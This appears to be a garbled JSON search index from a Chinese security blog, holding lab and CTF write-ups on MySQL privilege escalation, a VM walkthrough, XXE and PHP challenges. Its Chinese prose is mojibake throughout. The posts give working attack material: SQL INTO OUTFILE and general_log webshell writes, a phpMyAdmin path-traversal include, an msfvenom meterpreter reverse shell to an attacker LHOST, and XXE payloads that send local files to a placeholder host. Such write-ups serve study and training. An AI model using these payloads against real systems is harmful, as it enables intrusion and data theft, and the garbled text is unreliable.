outputObj[key] = FUNCFLAG + funcStr; } else { outputObj[key] = obj[key]; } } } return JSON.stringify(outputObj); }; var unserialize = function(obj) { obj = JSON.parse(obj); if (typeof obj === &#39;string&#39;) { return obj; } var key; for(key in obj) { if(typeof obj[key] === &#39;string&#39;) { if(obj[key].indexOf(FUNCFLAG) === 0) { var func_code=obj[key].substring(FUNCFLAG.length); if (validCode(func_code)){ var d = &#39;(&#39; + func_code + &#39;)&#39;; obj[key] = eval(d); } } } } return obj; }; app.use(bodyParser()); app.use(bodyParser.json()); app.use(express.static(path.join(__dirname, &#39;views&#39;))); app.use(function (req, res, next) { if (validInput(req.body)) { next(); } else { res.status(403).send(&#39;Hacker!!!&#39;); } }); async function index(req, res) { res.sendFile(path.resolve(__dirname, &#39;static/index.html&#39;)); } async function record(req, res, next) { new Promise(function (resolve, reject) { var record = new Record(); var score = req.body.score; if (score.length &lt; String(highestScore).length) { merge(record, { lastScore: score, maxScore: Math.max(parseInt(score),record.maxScore), lastTime: new Date().toString() }); highestScore = highestScore &gt; parseInt(score) ? highestScore : parseInt(score); if ((score - highestScore) &lt; 0) { var banner = &quot;ä¸å¥½ï¼Œæ²¡æœ‰ç²¾ç¥ï¼&quot;; } else { var banner = unserialize(serialize_banner).banner; } } res.json({ banner: banner, record: record }); }).catch(function (err) { next(err) }) } app.post(&#39;/record&#39;, record); app.get(&#39;/&#39;, index); app.get(&#39;/source&#39;, function (req, res) { opn(&#39;app.js&#39;).then(() =&gt; { res.sendFile(path.join(__dirname, &#39;app.js&#39;)); }); }) app.use(function (err, req, res, next) { console.log(err.stack); res.status(500).send(&#39;Some thing broke!&#39;) }); app.listen(&#39;3000&#39;);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"mysqlææƒ","slug":"mysqlææƒ","date":"2021-03-07T09:36:46.000Z","updated":"2021-03-07T12:37:17.598Z","comments":true,"path":"2021/03/07/mysqlææƒ/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/07/mysqlææƒ/","excerpt":"","text":"å®éªŒç¯å¢ƒ æ”»å‡»æœº: kali2020 192.168.182.137 é¶æœºï¼šwin7 192.168.182.128 æƒé™è·å–è´¦å·å¯†ç ç™»å½•è¿œç¨‹è¿æ¥ å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£,æˆ–è€…çŸ¥é“ç”¨æˆ·åå¯†ç ,ä½†æ˜¯è¿™é‡Œæ²¡æœ‰è¿ä¸Š,å› ä¸ºé»˜è®¤æƒ…å†µä¸‹mysqlè´¦å·æ˜¯ä¸å…è®¸è¿œç¨‹ç™»å½•çš„, å®¢æˆ·ç«¯ç™»å½•é€šè¿‡phpMyadminç™»å½•,å³ä½¿æ²¡æœ‰å¼€å¯è¿œç¨‹ç™»å½•ä¹Ÿå¯ä»¥ä½¿ç”¨phpMyadminç™»å½• å¯†ç è·å–1.æš´åŠ›ç ´è§£ 2.è¯»å–ç½‘ç«™é…ç½®æ–‡ä»¶æ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç  å…³é”®å­—ï¼šconfig conn data sql inc databaseç­‰ 3.Hashè·å– MySQL &lt;= 5.6 ç‰ˆæœ¬select host, user, password from mysql.user; MySQL &gt;= 5.7 ç‰ˆæœ¬select host,user,authentication_string from mysql.user; æŸ¥çœ‹å¯†ç æ–‡ä»¶,User.MYDæ–‡ä»¶ä¸€èˆ¬åœ¨mysqlæ•°æ®åº“æ–‡ä»¶å¤¹ä¸‹:https://www.cnblogs.com/hack404/p/10790529.html å­˜åœ¨æ³¨å…¥è‹¥ç½‘ç«™å­˜åœ¨sqlæ³¨å…¥ï¼Œåˆ™å¯ä»¥é€šè¿‡sqlmapçš„--sql-shellå‚æ•°æ¥è·å¾—æ•°æ®åº“æ“ä½œæƒé™ sqlmap -u &quot;192.168.182.128/sqli-labs/Less-1/?id=1&quot; --sql-shell mysqlæ¼æ´CVE-2012-2122 ç­‰è¿™ç±»æ¼æ´ç›´æ¥æ‹¿ä¸‹ MySQL æƒé™ getshellä¸€èˆ¬éƒ½æ˜¯åˆ©ç”¨sqlæƒé™æ¥æå‡åˆ°www-dataæƒé™ è¿™é‡Œåˆ†äº«ä¸€ç¯‡æ–‡ç« ,æ˜¯æ ¹æ®mysqlæ³¨å…¥ç‚¹ææƒçš„ https://www.cnblogs.com/zzjdbk/p/12992288.html æ³¨å…¥:ç›´æ¥é€šè¿‡å†™å…¥æ–‡ä»¶æ¥getshellï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ æ²¡æœ‰è¿è¡Œåœ¨ secure-file-priv æ¨¡å¼ä¸‹ å¯¹ Web ç›®å½•æœ‰è¯»å†™æƒé™ é«˜æƒé™æ•°æ®åº“ç”¨æˆ· åœ¨mysql5.7çš„ç‰ˆæœ¬ä¸‹,secure-file-privé»˜è®¤ä¸ºNULL,ä¸å…è®¸å¯¼å…¥å’Œå¯¼å‡º è·å–ç»å¯¹è·¯å¾„çš„æ–¹æ³• 1.phpinfo() 2.å‡ºé”™é¡µé¢ 3.load_fileè¯»å–ç½‘ç«™é…ç½®æ–‡ä»¶ å¦‚index.php /etc/passwd 4.æŸ¥çœ‹æ•°æ®åº“è¡¨å†…å®¹è·å– æœ‰ä¸€äº›cmsä¼šä¿å­˜ç½‘ç«™é…ç½®æ–‡ä»¶ æˆ–è€…è·¯å¾„ 5.è¿›å…¥åå° 6.ç™¾åº¦å‡ºé”™ä¿¡æ¯ zoomeye shadon æœç´¢error warning 7. @@datadirå‚æ•°çœ‹mysqlè·¯å¾„ åçŒœç»å¯¹è·¯å¾„ è¿™éƒ¨åˆ†æ‡’å¾—å†™äº†,å°±ç›´æ¥copy cyzccå¸ˆå‚…çš„äº† into oufile å†™ shellç›´æ¥é€šè¿‡å†™å…¥æ–‡ä»¶æ¥getshellï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ æ²¡æœ‰è¿è¡Œåœ¨ secure-file-priv æ¨¡å¼ä¸‹ å¯¹ Web ç›®å½•æœ‰è¯»å†™æƒé™ é«˜æƒé™æ•°æ®åº“ç”¨æˆ· è·å–ç»å¯¹è·¯å¾„çš„æ–¹æ³• 1.phpinfo() 2.å‡ºé”™é¡µé¢ 3.load_fileè¯»å–ç½‘ç«™é…ç½®æ–‡ä»¶ å¦‚index.php /etc/passwd 4.æŸ¥çœ‹æ•°æ®åº“è¡¨å†…å®¹è·å– æœ‰ä¸€äº›cmsä¼šä¿å­˜ç½‘ç«™é…ç½®æ–‡ä»¶ æˆ–è€…è·¯å¾„ 5.è¿›å…¥åå° 6.ç™¾åº¦å‡ºé”™ä¿¡æ¯ zoomeye shadon æœç´¢error warning 7. @@datadirå‚æ•°çœ‹mysqlè·¯å¾„ åçŒœç»å¯¹è·¯å¾„ è¿˜å¯ä»¥æŸ¥è¯¢select @@datadirå‚æ•°å¾—åˆ°mysqlè·¯å¾„ä»è€ŒçŒœæµ‹å¾—åˆ°ç½‘ç«™è·¯å¾„ è¿™é‡Œä¸€èˆ¬çŒœæµ‹ç½‘ç«™è·¯å¾„ä¸º C:\\phpStudy\\PHPTutorial\\wwwC:\\phpStudy\\PHPTutorial\\WWWC:\\phpStudy\\PHPTutorial\\htmlC:\\phpStudy\\PHPTutorial\\wwwrootâ€¦â€¦â€¦. æŸ¥çœ‹mysqlå®‰å…¨è®¾ç½® show global variables like &#39;%secure_file_priv%&#39;; secure_file_priv å¯ä»¥è®¾ç½®ä¸‰ä¸ªå‚æ•°ï¼šç©ºï¼ŒNULLï¼Œfilepath å‚æ•°è¯´æ˜ï¼š ç©ºå€¼ï¼šè®¾ç½®ä¸ºç©ºæ—¶ï¼Œæ²¡æœ‰è¿›è¡Œå®‰å…¨é…ç½®ï¼Œé‚£ä¹ˆè¿™æ¨¡å¼ä¸‹åº”è¯¥å°±å¯ä»¥å¯¼å‡º webshell NULLï¼šè®¾ç½®æœ¬å‚æ•°å€¼æ—¶ï¼Œæ•°æ®åº“ä¸èƒ½è¿›è¡Œå¯¼å…¥å¯¼å‡º filepathï¼šfilepath æ˜¯å¯¼å…¥å¯¼å‡ºçš„æ–‡ä»¶è·¯å¾„ï¼Œè®¾ç½®è¿™ä¸ªå€¼ï¼Œé‚£ä¹ˆåªèƒ½å¯¼å‡ºæ–‡ä»¶åˆ° filepath çš„è·¯å¾„ã€‚ è¿™é‡Œéœ€è¦æ»¡è¶³ secure_file_priv ä¸ºç©ºæˆ–è€…ä¸º web è·¯å¾„æ‰å¯ä»¥è¿›è¡Œè¯»å†™æ“ä½œï¼Œå¦‚æœä¸ä¸ºç©ºå¯åœ¨ mysql.ini é…ç½®æ–‡ä»¶ä¸­åŠ ä¸Š secure_file_priv = å³å¯ æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ä¾¿å¯ä½¿ç”¨sqlè¯­å¥æ¥å†™shell ç›´æ¥åœ¨æ¼æ´ç‚¹ä½¿ç”¨è”åˆæŸ¥è¯¢å†™å…¥ï¼š ?id=1&#39; union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &#39;C:/phpStudy/PHPTutorial/WWW/cyz.php&#39;--+ ä½¿ç”¨sqlmapå†™shellsqlmap -u &quot;http://192.168.43.130/sqli-labs/Less-1/?id=1&quot; --file-write=&quot;cyz.php&quot; --file-dest=&quot;C:/phpStudy/PHPTutorial/WWW/sqlmap_cyz.php&quot;cyz.phpä¸ºæœ¬åœ°æ–‡ä»¶ ä½¿ç”¨sqlmapçš„--os-shellå†™å…¥shell phpmyadminä½¿ç”¨æ—¥å¿—å†™å…¥shellä½¿ç”¨è´¦å·å¯†ç ç™»å½•åï¼Œé™¤äº†ä½¿ç”¨ä¸Šé¢çš„SQLè¯­å¥æ¥å†™å…¥shellå¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•æ¥getshellå¦‚phpmyadminä¸­çš„æ–‡ä»¶åŒ…å«æ¼æ´ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ç­‰æ¥getshell ä½¿ç”¨ log å†™å…¥ Shell æ»¡è¶³æ¡ä»¶ï¼š æ•°æ®åº“ä¸º root æƒé™ Web ç›®å½•å¯å†™ çŸ¥é“ Web çš„ç‰©ç†ç»å¯¹è·¯å¾„ é¦–å…ˆå¼€å¯ mysql çš„æ—¥å¿—è®°å½•æ¨¡å¼ é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æ—¥å¿—çš„é…ç½®ï¼š show variables like &#39;%general%&#39;; æ‰“å¼€æ—¥å¿—è®°å½• set global general_log=&#39;on&#39;; ç„¶åæ”¹å˜æ—¥å¿—çš„è·¯å¾„ set global general_log_file=&#39;C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\mysql_shell.php&#39;; ä¹‹åéšä¾¿æ‰§è¡Œä¸€æ®µphpä»£ç ç„¶åè®¿é—®mysql_shell.phpå³å¯getshell SELECT &quot;&lt;?php phpinfo();?&gt;&quot;; PHPMyAdmin åŒ…å«æ•°æ®åº“æ–‡ä»¶ getshellé¦–å…ˆæŸ¥è¯¢æ•°æ®åº“æ–‡ä»¶çš„å­˜å‚¨åœ°å€: show global variables like &quot;%datadir%&quot;; å…¶ä¸­çš„.frm å³ä¸ºæˆ‘ä»¬çš„æ•°æ®åº“æ–‡ä»¶ åœ¨ mysql_shell åº“ä¸­æ–°å»ºä¸ª mysql_shell è¡¨ï¼Œç„¶åå­—æ®µå†™ä¸Šæˆ‘ä»¬çš„ä¸€å¥è¯é©¬ å¯ä»¥çœ‹åˆ°ä¸€å¥è¯æœ¨é©¬å·²ç»å†™å…¥.frmæ–‡ä»¶ ä¹‹åä½¿ç”¨PHPMyAdmin4.8.x ç‰ˆæœ¬çš„æ–‡ä»¶åŒ…å«æ¼æ´å³å¯è¿›è¡Œåˆ©ç”¨ /index.php?target=db_sql.php%3f/../../../../../../../../../../../../../../C:/phpStudy/PHPTutorial/MySQL/data/test/mysql_shell.frm ç”±äºæ²¡æœ‰è¯¥ç‰ˆæœ¬ï¼Œå°±æ²¡æœ‰æ¥ç€å¤ç°äº† å…¶ä»–phpmyadminç‰ˆæœ¬çš„æ¼æ´ phpmyadminå‘½ä»¤æ‰§è¡Œæ¼æ´:CVE-2016-5734 PHPMyaAdmin æœ¬åœ° SESSION åŒ…å« getshell:CVE-2018-12613","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"chilié¶æœº","slug":"chilié¶æœº","date":"2021-03-06T14:11:04.000Z","updated":"2021-03-07T03:39:27.803Z","comments":true,"path":"2021/03/06/chilié¶æœº/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/06/chilié¶æœº/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç° æ¼æ´å‘ç°ä¸åˆ©ç”¨æ‰«ä¸€ä¸‹80ç«¯å£ç›®å½•æ²¡æ‰«å‡ºæ¥ä¸œè¥¿,ç›®æ ‡é”å‘21ç«¯å£,cewlå·¥å…·è·‘ä¸€ä¸‹å…³é”®è¯,è·å–åˆ°å¯èƒ½å­˜åœ¨çš„ç”¨æˆ·å æš´åŠ›ç ´è§£ ç”¨æˆ·å: chili å¯†ç : a1b2c3d4 ç™»å½•ftp ftp 192.168.182.131 å‘ç°æœ‰777æƒé™çš„ç›®å½• è¿›å…¥åç”¨msfç”Ÿæˆshellå¹¶ä¸Šä¼  msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.200.129 LPORT=4444 -f raw &gt; shell.php åˆ«å¿˜äº†ç»™shellåŠ 777æƒé™ æµè§ˆå™¨è®¿é—®shellæˆåŠŸæ‹¿åˆ°shell ææƒuse exploit/multi/handler set payload php/meterpreter_reverse_tcp set LHOST 192.168.43.221 set LPORT 2233 run æµè§ˆå™¨è®¿é—®æˆ‘ä»¬çš„shell è¿›å…¥äº¤äº’æ¨¡å¼ åœ¨.nanoç›®å½•ä¸­ä½¿ç”¨wgetä¸‹è½½https://github.com/luke-goddard/enumyææƒè„šæœ¬ å…³äºenumyå·¥å…·:https://www.cnblogs.com/zzjdbk/p/14094663.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"åˆæ¢xxe","slug":"åˆæ¢xxe","date":"2021-03-03T13:50:24.000Z","updated":"2021-03-04T11:15:23.887Z","comments":true,"path":"2021/03/03/åˆæ¢xxe/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/03/åˆæ¢xxe/","excerpt":"","text":"å‚è€ƒé“¾æ¥:https://xz.aliyun.com/t/3357#toc-0 ç¯å¢ƒé…ç½®å› ä¸ºxxeçš„åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»,è‡ªå·±æ­ç¯å¢ƒå¾ˆæœ‰å¯èƒ½ä¼šå‡ºé—®é¢˜ã€‚è¿™é‡Œå°±ä½¿ç”¨vulhubä¸Šçš„é¶æœºæ¥è¿›è¡Œå®éªŒ vulhubæ­å»º: https://vulhub.org/#/docs/install-docker-one-click/ ä¸‹è½½é“¾æ¥: https://codeload.github.com/vulhub/vulhub/zip/master å…·ä½“æ­å»ºæµç¨‹: https://www.77169.net/html/264526.html xxeæ¼æ´çš„äº§ç”Ÿä¸phpç‰ˆæœ¬æ— å…³,ä¸»è¦æ˜¯libxmlçš„æ‹“å±•ã€‚2.9ä»¥åé»˜è®¤ä¸ä½¿ç”¨å¤–éƒ¨å®ä½“,å¯¼è‡´xxeå‡ ä¹ç­ç» libxml_disable_entity_loader(false); //å¦‚æœä¸ºtrue,åˆ™æ— æ³•å¯¼å…¥å¤–éƒ¨å®ä½“,é˜²å¾¡ä¸€åŠä¹Ÿæ˜¯è¿™æ ·é˜²å¾¡çš„ simplexml_load_string($xml, ï¼ŒSimpleXMLElementâ€™, LIBXML_NOENT); //éœ€è¦åŠ LIBXML_NOENTå‚æ•°,ä¸ç„¶æ— æ³•å¯¼å…¥å¤–éƒ¨å®ä½“ã€‚ ä½†æ˜¯æˆ‘åœ¨æˆ‘çš„æœåŠ¡å™¨ä¸Šè¿™æ ·é…ç½®äº†è¿˜æ˜¯æ— æ³•å¯¼å…¥å¤–éƒ¨å®ä½“ï¼Œåº”è¯¥è¿˜æœ‰ä¸€äº›é…ç½®ä¼šå½±å“, æœ¬åº”æ¥è¯´xxeåº”è¯¥å¾ˆå°‘è§äº†,ä½†æ˜¯æŠ¤ç½‘é¢è¯•çš„æ—¶å€™é¢è¯•å®˜è¿˜æ˜¯é—®äº†æˆ‘æ˜¯å¦å­¦è¿‡xxe,æ‰€ä»¥è¿˜æ˜¯å­¦ä¹ ä¸€ä¸‹ã€‚ å·¥å…·ä»‹ç» ç½‘ä¸Šå·²ç»æœ‰å¯ä»¥è‡ªåŠ¨æ£€æµ‹XXEæ¼æ´çš„å¼€æºå·¥å…·:xxeinjector ä½¿ç”¨ä»‹ç»: https://www.freebuf.com/sectool/170971.html XMLå‡½æ•°loadXMLï¼š &lt;?php $data = file_get_contents(&#39;php://input&#39;); $dom = new DOMDocument(); $dom-&gt;loadXML($data); print_r($dom); SimpleXMLElement: &lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = new SimpleXMLElement($data); echo $xml-&gt;name; simplexml_load_string: &lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = simplexml_load_string($data); echo $xml-&gt;name; XXEåˆ©ç”¨æœ‰å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; ä½†æ˜¯å¦‚æœè¿”å›çš„æ–‡ä»¶ä¸­æœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦,å¦‚&lt;&gt;&amp;â€â€ä¼šè¢«å½“æˆXMLæ¥æ‰§è¡Œ,ä»è€ŒæŠ¥é”™,è¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨CDATA payloadï¼š &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶payload: xml.php &lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#39;php://input&#39;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt; payloadï¼š &lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt; %remote;%int;%send; ]&gt; åŒå¼•å·ä¸­çš„%éœ€è¦ç¼–ç ä¸º&amp;#37 CTFä¾‹é¢˜[NCTF2019]Fake XML cookbookè¿›å»æ˜¯ä¸€ä¸ªç™»å½•æ¡†,F12æŸ¥çœ‹æºç  function doLogin(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;doLogin.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus); } }); } emmâ€¦..JavaScriptå­¦å¾—ä¸æ˜¯å¾ˆå¤š,çœ‹ä¸æ‡‚ä»£ç ,ä½†æ˜¯å¯ä»¥çœ‹å‡ºæ•°æ®æ˜¯ä»¥XMLå½¢å¼ä¼ è¾“çš„,è€Œä¸”æ•°æ®ä¸º: â€œ + username + â€œâ€œ + password + â€œ æŠ“åŒ…ä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ è¾“çš„æ•°æ® å‘ç°ä»–ä¼šè¿”å›æˆ‘ä»¬çš„usernameçš„å€¼,åå°ä»£ç å¤§æ¦‚æ˜¯echo $xml-&gt;msg ä¹‹ç±»çš„ payload: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;2&lt;/password&gt;&lt;/user&gt; [NCTF2019]True XML cookbookè¿˜æ˜¯å’Œä¸Šä¸€é“é¢˜ä¸€æ ·çš„,è¯»å–ä¸€ä¸‹flagæ–‡ä»¶,å‘ç°æŠ¥é”™ Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/doLogin.php:16) in /var/www/html/doLogin.php on line \\31\\ å»è¯»ä¸€ä¸‹doLogin.php æ³¨æ„: phpæ–‡ä»¶è¦ç”¨php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php è§£ç ä¸€ä¸‹ &lt;?php /** * autor: c0ny1 * date: 2018-2-7 */ $USERNAME = &#39;admin&#39;; //Ã¨Â´Â¦Ã¥ÂÂ· $PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //Ã¥Â¯Â†Ã§ Â $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#39;php://input&#39;); try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); }else{ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); } }catch(Exception $e){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage()); } header(&#39;Content-Type: text/html; charset=utf-8&#39;); echo $result;Cj8 ç„¶åå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†,å› ä¸ºæˆ‘å‘æ‰¾åˆ°ä¸ºä»€ä¹ˆæŠ¥é”™çš„åŸå›  å°±å»çœ‹wpäº†,ç»“æœwpä¹Ÿæ²¡æœ‰è¯´æ˜¯ä¸ºä»€ä¹ˆæŠ¥é”™,æˆ‘ä¼°è®¡æ˜¯å› ä¸ºæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶ ç„¶åwpä¸­å†™çš„æŸ¥çœ‹æ•æ„Ÿç›®å½•/etc/hosts æ‰¾åˆ°æˆ‘ä»¬æ‰€åœ¨çš„ç½‘æ®µ,è¿›è¡Œå†…ç½‘æ¢æµ‹ ssrfä½œä¸ºä¸€ç§æ”»å‡»æ‰‹æ®µè¢«ç”¨åœ¨äº†xxeä¸Š,æ‰€ä»¥ssrfå¯ä»¥åšçš„xxeä¹Ÿå¯ä»¥å»å®Œæˆ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"æå®¢å¤§æŒ‘æˆ˜","slug":"æå®¢å¤§æŒ‘æˆ˜","date":"2021-02-24T14:42:46.000Z","updated":"2021-03-02T07:18:32.939Z","comments":true,"path":"2021/02/24/æå®¢å¤§æŒ‘æˆ˜/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/24/æå®¢å¤§æŒ‘æˆ˜/","excerpt":"","text":"2020welcome&lt;?php error_reporting(0); if ($_SERVER[&#39;REQUEST_METHOD&#39;] !== &#39;POST&#39;) { header(&quot;HTTP/1.1 405 Method Not Allowed&quot;); exit(); } else { if (!isset($_POST[&#39;roam1&#39;]) || !isset($_POST[&#39;roam2&#39;])){ show_source(__FILE__); } else if ($_POST[&#39;roam1&#39;] !== $_POST[&#39;roam2&#39;] &amp;&amp; sha1($_POST[&#39;roam1&#39;]) === sha1($_POST[&#39;roam2&#39;])){ phpinfo(); // collect information from phpinfo! } } æ•°ç»„ç»•è¿‡roam1[]=1&amp;roam2[]=2 myblogçŸ¥è¯†ç‚¹ ä¿®æ”¹PHPSESSIONï¼Œä½¿$_session[â€˜passwordâ€™]ä¸ºç©º,ç»•è¿‡== ä½¿ç”¨zip://åè®®åŒ…å«å›¾ç‰‡é©¬ æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªç½‘ç«™,urlå°è¯•ä¸€ä¸‹æ–‡ä»¶åŒ…å« åˆ©ç”¨filteråè®®è¯»å–ä¸€ä¸‹æ–‡ä»¶ #login &lt;?php require_once(&quot;secret.php&quot;); mt_srand($secret_seed); $_SESSION[&#39;password&#39;] = mt_rand(); ?&gt; #secret &lt;?php $secret_seed = mt_rand(); ?&gt; #admin/user //ç™»å½•åçš„urlä¸­æœ‰è¯¥è·¯å¾„ &lt;?php error_reporting(0); session_start(); $logined = false; if (isset($_POST[&#39;username&#39;]) and isset($_POST[&#39;password&#39;])){ if ($_POST[&#39;username&#39;] === &quot;Longlone&quot; and $_POST[&#39;password&#39;] == $_SESSION[&#39;password&#39;]){ // No one knows my password, including myself $logined = true; $_SESSION[&#39;status&#39;] = $logined; } } if ($logined === false &amp;&amp; !isset($_SESSION[&#39;status&#39;]) || $_SESSION[&#39;status&#39;] !== true){ echo &quot;&lt;script&gt;alert(&#39;username or password not correct!&#39;);window.location.href=&#39;index.php?page=login&#39;;&lt;/script&gt;&quot;; die(); } ?&gt; &lt;?php if(isset($_FILES[&#39;Files&#39;]) and $_SESSION[&#39;status&#39;] === true){ $tmp_file = $_FILES[&#39;Files&#39;][&#39;name&#39;]; $tmp_path = $_FILES[&#39;Files&#39;][&#39;tmp_name&#39;]; if(($extension = pathinfo($tmp_file)[&#39;extension&#39;]) != &quot;&quot;){ $allows = array(&#39;gif&#39;,&#39;jpeg&#39;,&#39;jpg&#39;,&#39;png&#39;); if(in_array($extension,$allows,true) and in_array($_FILES[&#39;Files&#39;][&#39;type&#39;],array_map(function($ext){return &#39;image/&#39;.$ext;},$allows),true)){ $upload_name = sha1(md5(uniqid(microtime(true), true))).&#39;.&#39;.$extension; move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name); echo &quot;&lt;script&gt;alert(&#39;Update image -&gt; assets/img/upload/${upload_name}&#39;) &lt;/script&gt;&quot;; } else { echo &quot;&lt;script&gt;alert(&#39;Update illegal! Only allows like \\&#39;gif\\&#39;, \\&#39;jpeg\\&#39;, \\&#39;jpg\\&#39;, \\&#39;png\\&#39; &#39;) &lt;/script&gt;&quot;; } } } ?&gt; &lt;script&gt; document.write(new Date().getFullYear()) &lt;/script&gt;, admin/user.phpæœ‰ä¸¤æ®µï¼Œä¸€æ®µæ˜¯å…³äºç™»é™†çš„é€»è¾‘ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å…³äºæ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ã€‚ PHP if ($_POST[&#39;username&#39;] === &quot;Longlone&quot; and 